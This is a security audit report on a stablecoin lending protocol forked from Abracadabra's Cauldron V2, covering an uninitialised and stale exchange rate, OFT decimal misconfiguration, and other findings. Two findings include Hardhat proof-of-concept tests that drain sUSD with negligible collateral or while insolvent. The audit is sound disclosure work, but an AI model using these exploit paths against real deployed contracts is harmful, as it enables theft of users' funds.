# S-protocol Security Review
A pay-per-vulnerability security review of S Protocol was done by [giraffe0x](https://twitter.com/giraffe0x). This audit report contains all the issues found and accepted during the security review.

S protocol allows users to borrow a stablecoin against collateralized yield-bearing assets.

S protocol has requested for this audit to remain private and anonymous.

## Risk classification

| Severity           | Impact: High | Impact: Medium | Impact: Low |
| :----------------- | :----------: | :------------: | :---------: |
| Likelihood: High   |   Critical   |      High      |   Medium    |
| Likelihood: Medium |     High     |     Medium     |     Low     |
| Likelihood: Low    |    Medium    |      Low       |     Low     |

### Impact

- **High** - leads to a significant material loss of assets in the protocol or significantly harms a group of users.
- **Medium** - only a small amount of funds can be lost (such as leakage of value) or a core functionality of the protocol is affected.
- **Low** - can lead to any kind of unexpected behaviour with some of the protocol's functionalities that's not so critical.

### Likelihood

- **High** - attack path is possible with reasonable assumptions that mimic on-chain conditions and the cost of the attack is relatively low to the amount of funds that can be stolen or lost.
- **Medium** - only conditionally incentivized attack vector, but still relatively likely.
- **Low** - has too many or too unlikely assumptions or requires a huge stake by the attacker with little or no incentive.

### Actions required by severity level

- **Critical** - client **must** fix the issue.
- **High** - client **must** fix the issue.
- **Medium** - client **should** fix the issue.
- **Low** - client **could** fix the issue.


### Issues found

| Severity      | Count |
| :------------ | ----: |
| Critical risk |     0 |
| High risk     |     3 |
| Medium risk   |     3 |
| Low risk      |     1 |
| Informational |     4 |

# Findings

## High severity

### H-1 Init does not set exchangeRate, allowing all tokens to be stolen through borrowing
### Summary
`init`  in `C.sol` does not set exchangeRate. Allowing an attacker to steal all sUSD in the vault with minimal collateral.

### Vulnerability Detail
S Protocol's C contract is a fork of Abracadabra's Cauldron V2. When comparing Cauldron V2 to V3, it was noticed that the `init` function of V3 sets the exchangeRate while V2 does not. Initiating the contract without setting the exchangeRate presents a serious risk.

S / Cauldron V2:
```solidity
function init(bytes calldata data) public payable override {

require(address(collateral) == address(0), "Chamber: already initialized");

(collateral, oracle, oracleData, accrueInfo.INTEREST_PER_SECOND, LIQUIDATION_MULTIPLIER, COLLATERIZATION_RATE, BORROW_OPENING_FEE) = abi.decode(data, (IERC20, IOracle, bytes, uint64, uint256, uint256, uint256));

require(address(collateral) != address(0), "Chamber: bad pair");

}
```

Cauldron V3:
```solidity
function init(bytes calldata data) public payable override {

require(address(collateral) == address(0), "Cauldron: already initialized");

(collateral, oracle, oracleData, accrueInfo.INTEREST_PER_SECOND, LIQUIDATION_MULTIPLIER, COLLATERIZATION_RATE, BORROW_OPENING_FEE) = abi.decode(data, (IERC20, IOracle, bytes, uint64, uint256, uint256, uint256));

borrowLimit = BorrowCap(type(uint128).max, type(uint128).max);

require(address(collateral) != address(0), "Cauldron: bad pair");

(, exchangeRate) = oracle.get(oracleData); //@audit exchangeRate set

}
```
### Impact
If the exchangeRate is not set, and there is sUSD balance in the vault, an attacker can borrow and steal all sUSD while only providing insignificant collateral (as long as collateral is > 0).

The likelihood of exchangeRate not being set before sUSD is transferred in is high. Looking at S's deploy script, they initialise C and transfer sUSD to bentoBox, before any update of exchangeRate called, leaving it in a vulnerable state open to attack.

This is also evident in their tests, where they expect a borrower/user to `cook` with action ACTION_UPDATE_EXCHANGE_RATE before they borrow.

If S expects the Deployer to manually set the exchangeRate before transferring in sUSD, that is also risky as the deployer could mess up the order or even forget to do so.

### POC
Consider this scenario:
- S deploys BentoBox and C.
- After initialising C, sUSD are minted to the C clone
- Attacker calls borrow with 1 wei of WETH, and borrows/steals all available sUSD

Add this test to `contractsTestGoerli.js`:
```solidity
it('POC1: User can borrow all sUSD while insolvent', async () => {

const { addr1, cloneAddress, BentoBox, CMasterContract, sUSD, WETH_WHALE, wethContract } = await loadFixture(deployTestingFixture);

const nonce = await BentoBox.nonces(addr1.address);

const domainData = {

name: 'BentoBox V1',

chainId: 31337,

verifyingContract: BentoBox.address

};

const messageData = {

warning: 'Give FULL access to funds in (and approved to) BentoBox?',

user: addr1.address,

masterContract: CMasterContract,

approved: true,

nonce

};


const { v, r, s } = await generateSignature(addr1, domainData, messageData);


let cookData = { events: [], values: [], datas: [] };


const CClone = await ethers.getContractAt("C", cloneAddress)



await network.provider.request({

method: "hardhat_impersonateAccount",

params: [WETH_WHALE],

});


const signer = await ethers.getSigner(WETH_WHALE);

await wethContract.connect(signer).transfer(addr1.address, parseUnits('10', 18));

await wethContract.connect(addr1).approve(BentoBox.address, parseUnits('10000', 18));

cookData = actions.bentoSetApproval(cookData, addr1.address, CMasterContract, true, v, r, s);

// cookData = actions.updateExchangeRate(cookData, true, 0x00, 0x00); // @audit if user does not update exchangeRate, can borrow unlimited sUSD

cookData = actions.bentoDeposit(cookData, wethContract.address, addr1.address, parseUnits('1', 18), parseUnits('1', 18));

// user can provide very little collateral

cookData = actions.addCollateral(cookData, parseUnits('0.000001', 18,), addr1.address, false);

cookData = actions.borrow(

cookData,

parseUnits('10000', 18),

addr1.address
);


cookData = actions.bentoWithdraw(
cookData,
sUSD.address,
addr1.address,
parseUnits('10000', 18),
parseUnits('10000', 18),
0
);

await CClone.connect(addr1).cook(cookData.events, cookData.values, cookData.datas);

// user can borrow all sUSD while insolvent
expect(await sUSD.balanceOf(addr1.address)).to.equal(parseUnits('10000', 18));

});
```

### Tool used
Manual Review

### Recommendation
Follow the Abracadbra Cauldron V3 implementation and init with exchangeRate set.

### H-2 Modifier solvent() does not set exchangeRate, allowing insolvent borrowers to reduce collateral

### Summary
Critical modifier `solvent()` does not update exchangeRate, allowing a malicious user to borrow or reduceCollateral while insolvent, based off an old or stale exchangeRate.

### Vulnerability Detail
S Protocol's c contract is a fork of Abracadabra's Cauldron V2. When comparing Cauldron V2 to V3, it was noticed that the `solvent()` modifier of V3 updates the exchangeRate while V2 does not. Checking for solvency without updating the exchangeRate presents a serious risk.

S / Cauldron V2:
```solidity
modifier solvent() {
_;
require(_isSolvent(msg.sender, exchangeRate), "Chamber: user insolvent");
}
```

Cauldron V3:
```solidity
modifier solvent() {
_;
(, uint256 _exchangeRate) = updateExchangeRate(); // @audit missing from S
require(_isSolvent(msg.sender, _exchangeRate), "Cauldron: user insolvent");
}
```

The update of `exchangeRate` was found to be omitted at the end of the `cook` function in S/Cauldron V2, with the same impact.
### Impact
High. A malicious user can take advantage of an old or stale exchangeRate and continue to borrow more or reduce his collateral, despite being insolvent.

### POC
- A borrower deposited WETH as collateral and borrowed sUSD.
- After some time, the price of WETH drops, making the borrower insolvent.
- The borrower has no intention of making good his debt, and decides to take advantage of the stale exchange rate (not updated since WETH price dropped).
- He goes ahead and call `reduceCollateral` , allowing him to withdraw collateral despite being insolvent.
- The remaining collateral may not be sufficient to cover the loan resulting in bad debt to the protocol.

Add this test to `contractsTestGoerli.js`:

```solidity
it('POC2: User can borrow while insolvent with stale exchangeRate', async () => {

const { addr1, cloneAddress, BentoBox, cMasterContract, sUSD, WETH_WHALE, wethContract, ORACLE_UPDATER, oracleContract, DIAOracle } = await loadFixture(deployTestingFixture);

const nonce = await BentoBox.nonces(addr1.address);

const domainData = {
		name: 'BentoBox V1',
		chainId: 31337,
		verifyingContract: BentoBox.address
		};

const messageData = {
		warning: 'Give FULL access to funds in (and approved to) BentoBox?',
		user: addr1.address,
		masterContract: cMasterContract,
		approved: true,
		nonce
		};



const { v, r, s } = await generateSignature(addr1, domainData, messageData);

let cookData = { events: [], values: [], datas: [] };

const cClone = await ethers.getContractAt("c", cloneAddress)

await network.provider.request({
method: "hardhat_impersonateAccount",
params: [WETH_WHALE],
});

let signer = await ethers.getSigner(WETH_WHALE);

await wethContract.connect(signer).transfer(addr1.address, parseUnits('10', 18));
await wethContract.connect(addr1).approve(BentoBox.address, parseUnits('10000', 18));

cookData = actions.bentoSetApproval(cookData, addr1.address, cMasterContract, true, v, r, s);

cookData = actions.updateExchangeRate(cookData, true, 0x00, 0x00);

cookData = actions.bentoDeposit(cookData, wethContract.address, addr1.address, parseUnits('1', 18), parseUnits('1', 18));

cookData = actions.addCollateral(cookData, parseUnits('1', 18,), addr1.address, false);

cookData = actions.borrow(
			cookData,
			parseUnits('100', 18),
			addr1.address
			);

cookData = actions.bentoWithdraw(
			cookData,
			sUSD.address,
			addr1.address,
			parseUnits('100', 18),
			parseUnits('100', 18),
			0
			);



await cClone.connect(addr1).cook(cookData.events, cookData.values, cookData.datas);

expect(await sUSD.balanceOf(addr1.address)).to.equal(parseUnits('100', 18));

// console.log("Exchange rate before:", await cClone.exchangeRate());

await network.provider.request({
method: "hardhat_impersonateAccount",
params: [ORACLE_UPDATER],
});

signer = await ethers.getSigner(ORACLE_UPDATER);

// @audit Set WETH to very small value to make user insolvent
await DIAOracle.connect(signer).setValue("ETH/USD", parseUnits('1', 10), 0);

// @audit if user does not update exchangeRate, he can continue to borrow at the old rate
// await cClone.connect(addr1).updateExchangeRate();

// console.log("Exchange rate after:", await cClone.exchangeRate());

await cClone.connect(addr1).borrow(addr1.address, parseUnits('100', 18));

await BentoBox.connect(addr1).withdraw(sUSD.address, addr1.address, addr1.address, parseUnits('100', 18), 0);

expect(await sUSD.balanceOf(addr1.address)).to.equal(parseUnits('200', 18));
});
```

### Code Snippet
[c.sol line 969](https://github.com/sherlock-audit/2023-11-Sprotocol/blob/main/SProtocol/contracts/c.sol#L969)
[c.sol line 1261](https://github.com/sherlock-audit/2023-11-Sprotocol/blob/main/SProtocol/contracts/c.sol#L969)
### Tool used
Manual Review

### Recommendation
Follow the Abracadabra Cauldron V3 implementation and update exchangeRate before checking for solvency in both the modifier, and in the cook function.

### H-3 Incorrect implementation of OFTV2 leads to failure of cross-chain token transfer

### Summary
sUSD_OFT incorrectly sets `sharedDecimals` in the constructor to 18 decimals which will result in failure of most cross-chain token transfers.

### Vulnerability Detail
sUSD_OFT implements OFT V2, which supports both EVM and non-EVM chains see [link](https://layerzero.gitbook.io/docs/evm-guides/layerzero-omnichain-contracts/oft/oft-v1-vs-oftv2-which-should-i-use) and [link](https://www.npmjs.com/package/@layerzerolabs/solidity-examples/v/1.0.0).

> The main difference between the two versions comes from the limitations of the Non EVMs. Non EVM chains such as Aptos/Solana use Uint64 to represent balance. To account for this, OFTV2 uses Shared Decimals for value transfers to normalize the data type difference. It is recommended to use a smaller shared decimal point on all chains so that your token can have a larger balance. For example, if the decimal point is 18, then you can not have more than approximately 18 * 10^18 tokens bounded by the uint64.max.

Therefore, LZ instructs that OFT V2 is to be used with no more than 10 shared decimals.

sUSD_OFT however, sets `sharedDecimals` to 18 decimals, probably incorrectly assuming it was referring to the decimals of the token.

```solidity
constructor(address _lzEndpoint) OFTWithFee("SUSD", "sUSD", 18, _lzEndpoint)
```

### Impact
OFTV2 uses uint64 to encode value transfer for compatibility with aptos or solana.
```solidity
// OFTCoreV2.sol
function _ld2sd(uint _amount) internal view virtual returns (uint64) {
	uint amountSD = _amount / _ld2sdRate();
	require(amountSD <= type(uint64).max, "OFTCore: amountSD overflow");
	return uint64(amountSD);
}
```

As sUSD's decimals is 18, then uint64 can only represent approximately 18 tokens (uint64.max ~= 18 * 10^18).

Therefore, attempting to do a cross-chain transfer of more than 18 sUSD will result in overflow and revert. This breaks a core component of the omni-chain token implementation and is a serious error.

Impact: High
Likelihood: High

### Tool used
Manual Review

### Recommendation
See [Lybra Finance](https://etherscan.io/address/0xed1167b6Dc64E8a366DB86F2E952A482D0981ebd#readContract) implementation which sets sharedDecimals to 8 (decimals 18).
Alternatively, use OFTv1 which are solely for EVM chains without the need for sharedDecimals.

### M-1 Burn function forgets to update supply variable

### Summary
`burn` function in `sUSD_OFT.sol` forgets to update local `supply` variable.

### Vulnerability Detail
`sUSD_OFT.sol` tracks a `supply` variable which is updated after every mint.

```solidity
function mint(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0), "sUSD: no mint to zero address");

        uint256 totalMintedAmount = uint256(lastMint.time < block.timestamp - MINTING_PERIOD ? 0 : lastMint.amount) + _amount;
        uint256 tempSupply = totalSupply() * MINTING_INCREASE / MINTING_PRECISION;
        require(totalSupply() == 0 || tempSupply >= totalMintedAmount);

        lastMint.time = uint128(block.timestamp);
        lastMint.amount = uint128(totalMintedAmount);

        supply = totalSupply() + _amount; //@audit here
        _mint(_to, _amount);
    }
```

However, the burn function does not update it.
```solidity
function burn(uint256 _amount) public onlyOwner {
        uint256 balance = balanceOf(msg.sender);
        if (_amount <= 0) {
            revert SUSD__AmountMustBeMoreThanZero();
        }
        if (balance < _amount) {
            revert SUSD__BurnAmountExceedsBalance();
        }
        _burn(msg.sender, _amount);
    }
```
### Impact
This would lead to a mismatch between `supply` and `totalSupply` within the sUSD token contract. There could be other downstream consequences if there were external contracts that rely on the `supply` variable.

Furthermore, sUSD is an omni-chain token with burn/mint functionality that is expected to be called frequently, further aggravating the impact.

### Code Snippet
[Link](https://github.com/sherlock-audit/2023-11-Sprotocol/blob/main/SProtocol/contracts/sUSD_OFT.sol#L91)

### Recommendation
Decrease the supply variable during burn.

### M-2 Lack of deadline expiration and configurable slippage check on liquidates()

### Summary
`liquidates` function in `c.sol` does not implement any deadline expiration nor user-input slippage check which can lead to undesired outcomes.

``` solidity
function liquidates(
address[] calldata users,
uint256[] calldata maxBorrowParts,
address to,
ISwapper swapper
) public {
	.
	.
	if (swapper != ISwapper(0)) {
		swapper.swap(collateral, sUSD, msg.sender, allBorrowShare, allCollateralShare);
	}
}
```

### Vulnerability Detail
1) No deadline expiration
By not providing a deadline check, if the transaction is not confirmed immediately, a liquidator might not receive desired profits.

Consider this example:
- A borrow position is insolvent due to the price of WETH declining.
- Liquidator steps in to liquidate the position
- Due to gas price increasing, the transaction sits in the mempool waiting to be confirmed
- Eventually the transaction goes through, but does not result in profit because WETH price has changed
- Alternatively, If the borrower repays some of the debt before it is liquidated (frontruns the liquidation tx), then the profits from the liquidation are also reduced.

2) Forced slippage check
In the event that a swapper address is provided, a swap is called with `allBorrowShare` passed in. This ensures that there are sufficient tokens received after swap to repay the loan. However, this forces a liquidator to accept the minimum of allBorrowShare received, while slippage could eat up the rest of potential profits of the liquidator. A liquidator should be able to provide his own desired slippage check.

Consider this example:
- Liquidator liquidates a position, passing in a swapper contract to swap from WETH(collateral) to sUSD(loan token).
- `allBorrowShare` (loan amount) is 10,000 sUSD. And expected profit is 2,000 sUSD to the liquidator.
- After swap, due to slippage the 10,000 sUSD loan is repaid but the liquidator only receives 1,000 sUSD.
- At extreme cases, the liquidator may not receive any profit at all after repayment of the loan.
### Impact
Liquidators might liquidate positions while receiving less or no profit from the transaction.

### Recommendation
Consider adding a deadline and slippage parameter input to the `liquidates` function. Then check deadline against timestamp, and pass slippage parameters to the swapper contract.

### M-3 Bad debt is not socialized leading to possible bank run

### Summary

When a large bad debt happens in the system, it is "stuck" in the system forever with no incentive to cover it. User, whose account goes into bad debt has no incentive to add funds to it, he will simply use a new account. And the other users also don't have any incentive to repay bad debt for such user.

This means that the other users will never be unable to withdraw all funds due to this bad debt. This can cause a bank run, since the first users will be able to withdraw, but the last users to withdraw will be unable to do so (will lose funds), because protocol won't have enough funds to return them since this bad debt will remain unreturned infinitively and will, in fact, keep accumulating even more bad debt.

### Vulnerability Detail

If some users takes a huge borrow and later there is a quick price drop, which will cause user's account to fall into a large bad debt, there will be no incentive for the liquidators to fully liquidate user, because the assets he has won't be enough to compensate the liquidator, meaning partial liquidations will bring user to a state with 0 assets but still with borrowed assets (bad debt).

Since there is no incentive from any users to repay these assets, this borrow will remain in the system forever, meaning this is basically a loss of funds for the other users. If this accumulated bad debt is large enough, the users will notice this and might start a bank run, because the users who withdraw first will be able to do so, but those who try to withdraw later will be unable to do so, because the protocol won't have funds, only the "borrowed" amounts which will never be returned due to bad debt (those accounts only having borrow/debt without any assets).

### Impact

Bad debt accumulation can lead to a bank run from the users with the last users to withdraw losing all their funds without any ability to recover it.

### Tool used

Manual Review

### Recommendation

Consider introducing bad debt socialization mechanism like the other lending platforms. It will also help clear borrow balance from bad debt accounts, preventing it to further accumulate even more bad debt.

### L-1 Don't copy LayerZero contracts directly

### Summary
LayerZero code is copied directly into S's codebase. This is not recommended by LayerZero and the `solidity-examples` package should be used instead.

### Vulnerability Detail
The first item of the [LayerZero Integration Checklist](https://layerzero.gitbook.io/docs/evm-guides/layerzero-integration-checklist)  instructs to:

> Use the latest version of [`solidity-examples`](https://www.npmjs.com/package/@layerzerolabs/solidity-examples) package. Do not copy contracts from LayerZero repositories directly to your project.

S however has chosen to copy the contracts and does not list solidity-examples in their package.json.

```
import "./token/oft/v2/fee/OFTWithFee.sol";
```

### Impact
The use of outdated LayerZero OFT contracts or accidental changes to the copied LayerZero code can lead to unintended consequences and potentially cause bugs in the cross-chain token implementation.

### Recommendation
Use the latest version of LayerZero's solidity-examples package.

### I-1 Direct usage of ecrecover allows signature malleability

The `permit` function  calls the Solidity ecrecover function directly to verify the given signature. However, the ecrecover EVM opcode allows for malleable (non-unique) signatures and thus is susceptible to replay attacks. Although a replay attack on this contract is not possible since each user's nonce is used only once, rejecting malleable signatures is considered a best practice.

```solidity
require(
      ecrecover(_getDigest(keccak256(abi.encode(PERMIT_SIGNATURE_HASH, owner_, spender, value, nonces[owner_]++, deadline))), v, r, s) ==
          owner_,
      "ERC20: Invalid Signature"
  );
```

Instead, use the `recover` function from OpenZeppelin's ECDSA [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification.

### I-2 Lock pragmas to specific compiler version
Contracts should be deployed with the same compiler version and flags that they have been tested the most with. Locking the pragma helps ensure that contracts do not accidentally get deployed using, for example, the latest compiler which may have higher risks of undiscovered bugs. Contracts may also be deployed by others and the pragma indicates the compiler version intended by the original authors.

```
// bad
pragma solidity ^0.8.0;
// good
pragma solidity 0.8.18;
```

### I-3 Gas savings from using calldata instead of memory for function arguments that do not get mutated
In `liquidate` function arguments can be marked calldata instead of memory, as the data does not need to be changed (like updating values in array). This will save gas at runtime.

``` solidity
    function liquidate(
        address[] memory users,
        uint256[] memory maxBorrowParts,
        address to,
        ISwapperV2 swapper,
        bytes memory swapperData
    ) public virtual {
```

### I-4 Gas savings from using Custom Errors
Instead of using error strings, to reduce deployment and runtime cost, you should use Custom Errors. This would save both deployment and runtime cost.

```solidity
// instead of:
require(!blacklistedCallees[callee], "Cauldron: can't call");
// do
if(blacklistedCallees[callee]) revert Errors.BlacklistedCaller();
```
